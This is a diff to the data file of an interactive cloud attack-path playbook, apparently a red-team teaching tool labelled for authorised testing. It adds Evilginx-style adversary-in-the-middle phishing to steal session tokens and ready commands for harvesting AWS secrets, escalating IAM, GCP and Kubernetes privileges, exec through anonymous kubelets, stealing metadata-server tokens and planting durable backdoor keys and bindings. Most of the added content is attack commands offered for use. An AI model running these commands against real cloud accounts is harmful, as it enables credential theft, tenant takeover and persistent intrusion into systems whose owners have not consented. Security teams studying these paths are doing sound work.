@@ -33,8 +33,8 @@
 var CLOUD_MAP = {
   meta: {
     title: "Cloud Attack Path — Guided Playbook",
-    version: "v1",
-    note: "For authorised testing and study only. Click a section to expand it, then a technique for its commands."
+    version: "v2",
+    note: "For authorised testing and study only. Click a section to expand it, then a technique for its commands. Hold an identity but stuck? Open 'Out of ideas?' in Authenticated Enumeration and work the checklist."
   },
 
   // stage palette — access grows as you move down the map
@@ -162,6 +162,20 @@ var CLOUD_MAP = {
           ]
         },
         {
+          id: "aitm-phish",
+          title: "Adversary-in-the-middle (AiTM) phishing",
+          theory: { label: "AiTM Token & Session Theft", url: "theory/2026-10-15-aitm-token-and-session-theft.html" },
+          vuln: { label: "OAuth Misconfiguration", url: "vuln-detail.html?vuln=oauth-misconfig" },
+          desc: "A reverse-proxy phishing kit (Evilginx / Evilginx-style) relays the victim through the real Microsoft login — including MFA — and captures the issued session cookie / token. Replaying that token logs you in with MFA already satisfied. Often hosted on a trusted *.azurewebsites.net / *.r2.dev domain to beat reputation filtering.",
+          cmds: [
+            "# stand up an Evilginx phishlet for login.microsoftonline.com, lure the victim",
+            "# capture the ESTSAUTH(PERSISTENT) cookie / token, then replay it into a browser or token tool",
+            "# device-code and illicit-consent (below) are the no-proxy alternatives"
+          ],
+          outcomes: [{ label: "Session token", color: "#3b9ee5" }, { label: "MFA required", color: "#f59e0b" }],
+          moveTo: [{ section: "authenticated", note: "replay the captured session against Graph / portal" }]
+        },
+        {
           id: "leaked-keys",
           title: "Use leaked static credentials",
           theory: { label: "AWS Attack Paths", url: "theory/2026-10-09-aws-attack-paths.html" },
@@ -247,6 +261,43 @@ var CLOUD_MAP = {
           ],
           outcomes: [{ label: "Resource inventory", color: "#a78bfa" }],
           moveTo: [{ section: "azure-resource", note: "abuse the resource / RBAC plane" }]
+        },
+        {
+          id: "gcp-enum",
+          title: "GCP IAM & project enumeration",
+          theory: { label: "GCP Attack Paths", url: "theory/2026-10-15-gcp-attack-paths.html" },
+          desc: "List your roles, the service accounts you can impersonate, and the resources you can deploy to. Default Compute/App Engine/Cloud Build service accounts are historically Editor, so a deploy permission alone is often a privesc seed.",
+          cmds: [
+            "gcloud auth list ; gcloud projects list ; gcloud config get-value project",
+            "gcloud projects get-iam-policy <proj> --format=json",
+            "gcloud iam service-accounts list   # candidates to impersonate",
+            "# enumerate-iam style sweep: ScoutSuite gcp, or the IAM Recommender"
+          ],
+          outcomes: [{ label: "Privesc paths found", color: "#34d399" }],
+          moveTo: [{ section: "gcp", note: "impersonate / deploy-as / setIamPolicy" }]
+        },
+        {
+          id: "stuck",
+          title: "⟳ Out of ideas? map the whole blast radius",
+          theory: { label: "Entra ID & Azure Attack Paths", url: "theory/2026-10-09-entra-azure-attack-paths.html" },
+          desc: "Hold a principal but no obvious escalation? Systematically enumerate every plane this identity can touch — each branch names what to pull and the stage that abuses it.",
+          cmds: ["# run the provider's attack-path tool first, then verify by hand:", "# Entra -> AzureHound/roadrecon ; AWS -> pmapper ; GCP -> ScoutSuite ; K8s -> kubectl auth can-i --list"],
+          branches: [
+            { label: "Entra directory", note: "owned apps/SPs + their credentials, privileged/escalation-capable roles (Priv Auth Admin), dynamic groups, admin-consent rights, Administrative Units.", cmds: ["azurehound -u <user> -p <pass> list --tenant <tid> -o out.json"], outcomes: [{ label: "Privileged role", color: "#a78bfa" }] },
+            { label: "Azure resources (ARM/RBAC)", note: "managed identities on VMs/apps/automation, VM run-command, Key Vault data access, storage account keys / SAS.", cmds: ["az role assignment list --all --assignee <id>"], outcomes: [{ label: "Managed identity token", color: "#a78bfa" }] },
+            { label: "AWS IAM", note: "self-escalating IAM write actions, iam:PassRole to compute, assumable roles, login-profile/access-key takeover, Secrets Manager / SSM parameters.", cmds: ["pmapper query 'preset privesc <me>'"], outcomes: [{ label: "Account admin", color: "#4ade80" }] },
+            { label: "GCP IAM", note: "serviceAccounts.getAccessToken / actAs + deploy, *.setIamPolicy, serviceAccountKeys.create, signBlob/signJwt, default-SA Editor.", cmds: ["gcloud iam service-accounts get-iam-policy <sa>"], outcomes: [{ label: "Owner / impersonation", color: "#34d399" }] },
+            { label: "Kubernetes / containers", note: "SA token RBAC (create pods, secrets, bind/escalate/impersonate), privileged pod / container escape, node cloud identity (IRSA / workload identity), kubelet/etcd exposure.", cmds: ["kubectl auth can-i --list"], outcomes: [{ label: "cluster-admin", color: "#2dd4bf" }] },
+            { label: "Hybrid / cross-cloud", note: "Entra Connect sync server, federation (Golden SAML), cloud-managed endpoints (Intune / SSM) for fleet exec.", outcomes: [{ label: "Pivot on-prem", color: "#f59e0b" }] }
+          ],
+          moveTo: [
+            { section: "entra-privesc", note: "Entra directory findings" },
+            { section: "azure-resource", note: "Azure resource findings" },
+            { section: "aws-privesc", note: "AWS IAM findings" },
+            { section: "gcp", note: "GCP IAM findings" },
+            { section: "kubernetes", note: "cluster findings" },
+            { section: "lateral-hybrid", note: "hybrid / cross-cloud" }
+          ]
         }
       ]
     },
@@ -303,7 +354,8 @@ var CLOUD_MAP = {
           id: "role-assignment",
           title: "Privileged role & PIM abuse",
           theory: { label: "Entra ID & Azure Attack Paths", url: "theory/2026-10-09-entra-azure-attack-paths.html" },
-          desc: "Roles like Privileged Authentication Administrator or Authentication Administrator can reset other users' credentials/MFA — including higher-privileged accounts. Privileged Role Administrator can assign any directory role.",
+          cve: { id: "CVE-2025-55241", label: "Entra 'actor token' cross-tenant Global Admin (patched 2025)", url: "https://nvd.nist.gov/vuln/detail/CVE-2025-55241" },
+          desc: "Roles like Privileged Authentication Administrator or Authentication Administrator can reset other users' credentials/MFA — including higher-privileged accounts. Privileged Role Administrator can assign any directory role. Platform bugs have also reached GA directly — the 2025 'actor token' flaw let a token from one tenant impersonate any user in another (patched); match the tenant's state before assuming a technique still works.",
           cmds: [
             "# enumerate who holds escalation-capable roles",
             "az rest --method get --uri 'https://graph.microsoft.com/v1.0/directoryRoles'",
@@ -311,6 +363,19 @@ var CLOUD_MAP = {
           ],
           outcomes: [{ label: "Global Admin", color: "#4ade80" }],
           moveTo: [{ section: "takeover", note: "take over a Global Admin account" }]
+        },
+        {
+          id: "au-ca",
+          title: "Administrative Units & Conditional Access gaps",
+          theory: { label: "Entra ID & Azure Attack Paths", url: "theory/2026-10-09-entra-azure-attack-paths.html" },
+          desc: "A role scoped to an Administrative Unit (e.g. User Administrator over an AU) still resets passwords / rotates auth methods for the users in it — target an AU that happens to contain a privileged account. Separately, Conditional Access gaps (an excluded app, legacy-auth endpoint, or a device/location the policy trusts) let a stolen credential or token skip MFA entirely.",
+          cmds: [
+            "# AUs and their scoped role members",
+            "az rest --method get --uri 'https://graph.microsoft.com/v1.0/directory/administrativeUnits'",
+            "# hunt CA exclusions / legacy-auth allowances, then authenticate through the gap"
+          ],
+          outcomes: [{ label: "Privileged role", color: "#a78bfa" }, { label: "MFA bypassed", color: "#f59e0b" }],
+          moveTo: [{ section: "takeover", note: "reset a privileged account's credentials" }]
         }
       ]
     },
@@ -424,6 +489,19 @@ var CLOUD_MAP = {
           ],
           outcomes: [{ label: "Role credentials", color: "#22d3ee" }],
           moveTo: [{ section: "aws-privesc", note: "continue escalating along the chain" }]
+        },
+        {
+          id: "secrets-store",
+          title: "Secrets Manager / SSM Parameter Store",
+          theory: { label: "AWS Attack Paths", url: "theory/2026-10-09-aws-attack-paths.html" },
+          vuln: { label: "Secrets Exposure", url: "vuln-detail.html?vuln=secrets-exposure" },
+          desc: "The managed secret stores hold the keys to everything else — DB passwords, third-party API keys, other principals' credentials. A read permission (secretsmanager:GetSecretValue, ssm:GetParameters with decryption) harvests them directly.",
+          cmds: [
+            "aws secretsmanager list-secrets ; aws secretsmanager get-secret-value --secret-id <name>",
+            "aws ssm describe-parameters ; aws ssm get-parameters-by-path --path / --recursive --with-decryption"
+          ],
+          outcomes: [{ label: "Valid credentials", color: "#3b9ee5" }],
+          moveTo: [{ section: "authenticated", note: "re-enumerate with the recovered secrets" }]
         }
       ]
     },
@@ -446,6 +524,12 @@ var CLOUD_MAP = {
             "# or set a new default policy version if iam:CreatePolicyVersion is allowed",
             "aws iam create-policy-version --policy-arn <arn> --policy-document file://admin.json --set-as-default"
           ],
+          branches: [
+            { label: "CreatePolicyVersion — rewrite an attached managed policy", note: "iam:CreatePolicyVersion + SetAsDefault silently makes an attached policy grant *:*.", cmds: ["aws iam create-policy-version --policy-arn <arn> --policy-document file://admin.json --set-as-default"], outcomes: [{ label: "Account admin", color: "#4ade80" }] },
+            { label: "Attach/Put policy — add AdministratorAccess to self", note: "iam:AttachUserPolicy / PutUserPolicy / AttachRolePolicy / PutRolePolicy.", cmds: ["aws iam attach-user-policy --user-name <me> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess"], outcomes: [{ label: "Account admin", color: "#4ade80" }] },
+            { label: "Take over a privileged user (login profile / access key)", note: "iam:CreateLoginProfile / UpdateLoginProfile sets a console password on an admin with no password; iam:CreateAccessKey mints API keys for them; iam:AddUserToGroup joins an admin group.", cmds: ["aws iam create-access-key --user-name <priv-user>", "aws iam create-login-profile --user-name <priv-user> --password '<pw>' --no-password-reset-required"], outcomes: [{ label: "Account admin", color: "#4ade80" }] },
+            { label: "Rewrite a role's trust policy, then assume it", note: "iam:UpdateAssumeRolePolicy lets you add yourself as a trusted principal on a privileged role, then sts:AssumeRole into it.", cmds: ["aws iam update-assume-role-policy --role-name <privRole> --policy-document file://trust-me.json", "aws sts assume-role --role-arn arn:aws:iam::<acct>:role/<privRole> --role-session-name s"], outcomes: [{ label: "Role credentials", color: "#22d3ee" }, { label: "Account admin", color: "#4ade80" }] }
+          ],
           outcomes: [{ label: "Account admin", color: "#4ade80" }],
           moveTo: [{ section: "takeover", note: "you now hold account-wide admin" }]
         },
@@ -459,6 +543,11 @@ var CLOUD_MAP = {
             "aws lambda create-function --role arn:aws:iam::<acct>:role/<privRole> ...",
             "aws lambda invoke --function-name <fn> out.json",
             "# EC2 variant: launch an instance with an instance profile for the role"
+          ],
+          branches: [
+            { label: "Lambda — create or UpdateFunctionCode", note: "Pass a privileged role to a new function, or (iam:PassRole not even needed) swap the code of an existing function that already runs as a strong role with lambda:UpdateFunctionCode, and exfil its creds.", cmds: ["aws lambda update-function-code --function-name <fn> --zip-file fileb://evil.zip"], outcomes: [{ label: "Role credentials", color: "#22d3ee" }] },
+            { label: "EC2 instance profile", note: "Launch an instance with an instance profile for the privileged role, then read its creds from IMDS.", cmds: ["aws ec2 run-instances --iam-instance-profile Name=<profile> --image-id <ami> ..."], outcomes: [{ label: "Role credentials", color: "#22d3ee" }] },
+            { label: "Glue / CloudFormation / Data Pipeline", note: "Any service you can create that runs with a passed role executes as it — a Glue dev endpoint/job or a CloudFormation stack with a privileged service role.", cmds: ["aws glue create-dev-endpoint --role-arn <privRole> ..."], outcomes: [{ label: "Role credentials", color: "#22d3ee" }, { label: "Account admin", color: "#4ade80" }] }
           ],
           outcomes: [{ label: "Role credentials", color: "#22d3ee" }, { label: "Account admin", color: "#4ade80" }],
           moveTo: [{ section: "takeover", note: "if the passed role is privileged" }]
@@ -509,6 +598,12 @@ var CLOUD_MAP = {
             "# bind cluster-admin if you can create ClusterRoleBindings",
             "kubectl create clusterrolebinding x --clusterrole=cluster-admin --serviceaccount=<ns>:<sa>"
           ],
+          branches: [
+            { label: "create pods (or a workload controller)", note: "Schedule a privileged / hostPath / hostPID pod, or a Deployment/Job/DaemonSet that creates one, to run on and break out to a node.", cmds: ["kubectl auth can-i create pods", "kubectl run x --image=alpine --privileged --overrides='{\"spec\":{\"hostPID\":true,...}}'"], outcomes: [{ label: "Root on node", color: "#2dd4bf" }] },
+            { label: "bind / escalate (RBAC verbs)", note: "The 'bind' verb lets you create a RoleBinding to a higher role; 'escalate' lets you add permissions to a role beyond your own — either reaches cluster-admin.", cmds: ["kubectl create clusterrolebinding x --clusterrole=cluster-admin --serviceaccount=<ns>:<sa>"], outcomes: [{ label: "cluster-admin", color: "#2dd4bf" }] },
+            { label: "impersonate", note: "The 'impersonate' verb lets you act as another user/group/SA (e.g. system:masters) for a request — borrow cluster-admin without a binding.", cmds: ["kubectl get secrets -A --as=system:serviceaccount:kube-system:clusterrole-aggregation-controller"], outcomes: [{ label: "cluster-admin", color: "#2dd4bf" }] },
+            { label: "get/list secrets", note: "Reading Secrets across namespaces harvests SA tokens, registry creds and app secrets to pivot.", cmds: ["kubectl get secrets -A -o json"], outcomes: [{ label: "Cluster foothold", color: "#2dd4bf" }] }
+          ],
           outcomes: [{ label: "cluster-admin", color: "#2dd4bf" }],
           moveTo: [{ section: "kubernetes", tech: "node-metadata", note: "pivot to the cloud control plane" }]
         },
@@ -526,6 +621,22 @@ var CLOUD_MAP = {
           moveTo: [{ section: "kubernetes", tech: "node-metadata", note: "the node carries a cloud identity" }]
         },
         {
+          id: "exposed-components",
+          title: "Exposed kubelet / etcd / ingress",
+          theory: { label: "Kubernetes & Container Attacks", url: "theory/2026-10-09-kubernetes-container-attacks.html" },
+          cve: { id: "CVE-2025-1974", label: "IngressNightmare — unauth RCE in ingress-nginx", url: "https://nvd.nist.gov/vuln/detail/CVE-2025-1974" },
+          desc: "Unauthenticated control-plane components are a shortcut past RBAC. An anonymous kubelet API (10250) runs commands in any pod; etcd (2379) stores Secrets in plaintext unless encryption-at-rest is on; and ingress-nginx (IngressNightmare) gave unauth RCE in a pod whose SA can often read cluster-wide Secrets.",
+          cmds: [
+            "# kubelet: list pods, then exec in one",
+            "curl -sk https://<node>:10250/pods | jq '.items[].metadata.name'",
+            "curl -sk https://<node>:10250/run/<ns>/<pod>/<container> -d 'cmd=id'",
+            "# etcd: read secrets directly",
+            "etcdctl --endpoints=https://<node>:2379 get / --prefix --keys-only | grep secrets"
+          ],
+          outcomes: [{ label: "cluster-admin", color: "#2dd4bf" }, { label: "Cluster secrets", color: "#2dd4bf" }],
+          moveTo: [{ section: "kubernetes", tech: "node-metadata", note: "pivot to the node's cloud identity" }]
+        },
+        {
           id: "node-metadata",
           title: "Node cloud-identity theft",
           theory: { label: "Kubernetes & Container Attacks", url: "theory/2026-10-09-kubernetes-container-attacks.html" },
@@ -534,13 +645,91 @@ var CLOUD_MAP = {
             "# AWS node role",
             "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/",
             "# Azure AKS node managed identity",
-            "curl -H 'Metadata:true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'"
+            "curl -H 'Metadata:true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'",
+            "# GKE node SA (also: IRSA / Workload Identity annotations scope pod->cloud)",
+            "curl -s -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token'"
           ],
-          outcomes: [{ label: "Role credentials", color: "#22d3ee" }, { label: "Managed identity token", color: "#a78bfa" }],
+          outcomes: [{ label: "Role credentials", color: "#22d3ee" }, { label: "Managed identity token", color: "#a78bfa" }, { label: "Owner / impersonation", color: "#34d399" }],
           moveTo: [
             { section: "aws-privesc", note: "escalate from the node role (EKS)" },
-            { section: "azure-resource", note: "use the node MI (AKS)" }
+            { section: "azure-resource", note: "use the node MI (AKS)" },
+            { section: "gcp", note: "use the node SA (GKE)" }
           ]
+        }
+      ]
+    },
+
+    {
+      id: "gcp",
+      title: "GCP Privilege Escalation",
+      color: "#34d399",
+      tag: "GCP",
+      desc: "Turn a limited GCP principal into project Owner — nearly always through service-account impersonation, deploy-as, or an IAM policy rewrite, not a CVE.",
+      techniques: [
+        {
+          id: "sa-impersonate",
+          title: "Service-account impersonation (token minting)",
+          theory: { label: "GCP Attack Paths", url: "theory/2026-10-15-gcp-attack-paths.html" },
+          desc: "iam.serviceAccounts.getAccessToken (the Service Account Token Creator role) lets you mint a short-lived token as a target SA and act with every role it holds — often in other projects too. Chain impersonation across SAs until one is Owner.",
+          cmds: [
+            "gcloud iam service-accounts list",
+            "gcloud auth print-access-token --impersonate-service-account=<sa>@<proj>.iam.gserviceaccount.com",
+            "gcloud <anything> --impersonate-service-account=<sa>   # run as the SA"
+          ],
+          outcomes: [{ label: "Owner / impersonation", color: "#34d399" }, { label: "Account admin", color: "#4ade80" }],
+          moveTo: [{ section: "takeover", note: "if the SA is Owner / Org-level" }]
+        },
+        {
+          id: "actas-deploy",
+          title: "actAs + deploy-as a privileged SA",
+          theory: { label: "GCP Attack Paths", url: "theory/2026-10-15-gcp-attack-paths.html" },
+          desc: "iam.serviceAccounts.actAs plus a deploy permission lets you attach a privileged SA to a resource you create — a Compute instance, Cloud Function, Cloud Run service, or Deployment Manager config — whose code then runs as that SA. Read its token from the metadata server.",
+          cmds: [
+            "gcloud functions deploy x --runtime python311 --trigger-http --service-account=<privSA> --source .",
+            "# or a VM with a startup script that curls its own token:",
+            "gcloud compute instances create x --service-account=<privSA> --scopes=cloud-platform --metadata startup-script='...'"
+          ],
+          outcomes: [{ label: "Owner / impersonation", color: "#34d399" }],
+          moveTo: [{ section: "takeover", note: "if the attached SA is privileged" }]
+        },
+        {
+          id: "setiampolicy",
+          title: "setIamPolicy — grant yourself Owner",
+          theory: { label: "GCP Attack Paths", url: "theory/2026-10-15-gcp-attack-paths.html" },
+          desc: "Any *.setIamPolicy permission at project, folder, or org scope (resourcemanager.projects.setIamPolicy) lets an identity bind itself a higher role such as roles/owner — a one-call escalation.",
+          cmds: [
+            "gcloud projects add-iam-policy-binding <proj> --member='user:<me>' --role='roles/owner'",
+            "# folder/org scope: gcloud resource-manager folders/organizations add-iam-policy-binding ..."
+          ],
+          outcomes: [{ label: "Account admin", color: "#4ade80" }],
+          moveTo: [{ section: "takeover", note: "project Owner (or higher)" }]
+        },
+        {
+          id: "sa-key-sign",
+          title: "SA key creation & signBlob/signJwt",
+          theory: { label: "GCP Attack Paths", url: "theory/2026-10-15-gcp-attack-paths.html" },
+          desc: "iam.serviceAccountKeys.create mints a long-lived JSON key for a target SA (durable, MFA-free). signBlob/signJwt let you forge tokens for an SA without a key, and a Workspace-delegated SA can impersonate users domain-wide.",
+          cmds: [
+            "gcloud iam service-accounts keys create key.json --iam-account=<sa>@<proj>.iam.gserviceaccount.com",
+            "gcloud auth activate-service-account --key-file key.json"
+          ],
+          outcomes: [{ label: "Owner / impersonation", color: "#34d399" }, { label: "Persistence", color: "#fb7185" }],
+          moveTo: [
+            { section: "takeover", note: "if the SA is privileged" },
+            { section: "persistence", note: "the exported key is durable" }
+          ]
+        },
+        {
+          id: "gcp-metadata",
+          title: "Metadata token & default-SA Editor",
+          theory: { label: "GCP Attack Paths", url: "theory/2026-10-15-gcp-attack-paths.html" },
+          desc: "Code (or an SSRF) on a GCE VM / Cloud Run / GKE node reads the attached SA's token from the metadata server. The default Compute/App Engine/Cloud Build SAs were historically granted project Editor, so even a default attachment is usually a strong identity.",
+          cmds: [
+            "curl -s -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token'",
+            "curl -s -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes'"
+          ],
+          outcomes: [{ label: "Owner / impersonation", color: "#34d399" }],
+          moveTo: [{ section: "takeover", note: "default SA is often Editor -> escalate" }]
         }
       ]
     },
@@ -626,6 +815,18 @@ var CLOUD_MAP = {
           ],
           outcomes: [{ label: "Persistence", color: "#fb7185" }],
           moveTo: [{ section: "persistence", note: "backdoor identities org-wide" }]
+        },
+        {
+          id: "gcp-org-admin",
+          title: "GCP organization / project Owner",
+          theory: { label: "GCP Attack Paths", url: "theory/2026-10-15-gcp-attack-paths.html" },
+          desc: "Owner at project scope controls the project; Organization Admin / a broad setIamPolicy at org or folder scope reaches every project beneath it. From there, grant durable roles and read all resources.",
+          cmds: [
+            "gcloud organizations list ; gcloud projects list",
+            "gcloud organizations add-iam-policy-binding <orgId> --member='user:<me>' --role='roles/resourcemanager.organizationAdmin'"
+          ],
+          outcomes: [{ label: "Persistence", color: "#fb7185" }],
+          moveTo: [{ section: "persistence", note: "plant durable access before cleanup" }]
         }
       ]
     },
@@ -669,6 +870,18 @@ var CLOUD_MAP = {
           cmds: [
             "aws iam create-access-key --user-name <existing-user>   # second key",
             "# or a role whose trust policy allows an external/attacker principal to assume it"
+          ],
+          outcomes: [{ label: "Durable access", color: "#fb7185" }],
+          moveTo: []
+        },
+        {
+          id: "gcp-sa-key",
+          title: "GCP service-account key / IAM binding",
+          theory: { label: "GCP Attack Paths", url: "theory/2026-10-15-gcp-attack-paths.html" },
+          desc: "An exported SA key is a long-lived, MFA-free credential that survives user resets; a quiet IAM binding (a custom role, or a grant to an external/attacker principal) re-grants access and blends into normal policy. Domain-wide delegation on an SA is an especially durable Workspace backdoor.",
+          cmds: [
+            "gcloud iam service-accounts keys create bd.json --iam-account=<sa>",
+            "# or bind a controlled principal a standing role at project/org scope"
           ],
           outcomes: [{ label: "Durable access", color: "#fb7185" }],
           moveTo: []
